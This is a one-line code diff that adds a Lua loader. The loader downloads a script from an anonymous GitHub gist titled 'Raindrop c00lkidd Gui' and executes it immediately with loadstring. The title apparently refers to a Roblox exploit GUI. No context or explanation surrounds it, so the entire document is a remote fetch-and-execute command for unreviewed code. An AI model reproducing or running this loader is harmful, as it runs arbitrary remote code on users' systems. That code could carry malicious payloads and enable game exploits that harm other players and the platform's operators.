@@ -1,0 +1,1 @@
+loadstring(Raindrop:DownloadString('https://gist.githubusercontent.com/anonymous/f9d467b64be7f376bcb3d963f7a77c58/raw/a25e14bdaa851a7b6e1057b85378985cd49098ae/Raindrop%2520c00lkidd%2520Gui'))()
